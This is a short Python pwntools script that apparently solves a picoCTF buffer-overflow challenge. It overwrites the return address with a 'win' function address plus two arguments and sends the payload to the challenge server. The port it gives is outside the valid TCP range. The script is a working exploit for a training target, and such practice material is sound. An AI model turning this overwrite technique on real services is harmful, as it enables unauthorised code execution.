from pwn import *
from time import sleep

host, port = 'saturn.picoctf.net', 563121

p = connect(host, port)
p.recvuntil('Please enter your string: ')

win = 0x08049296
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

injection = b''

injection = b'A' * 112 # buffsize
injection += p32(win) # win addr to access
injection += b'b' * 4 # bp
injection += p32(arg1)
injection += p32(arg2)

print(injection)
p.sendline(injection)
sleep(2)
print(p.recv())
p.interactive()
p.close()
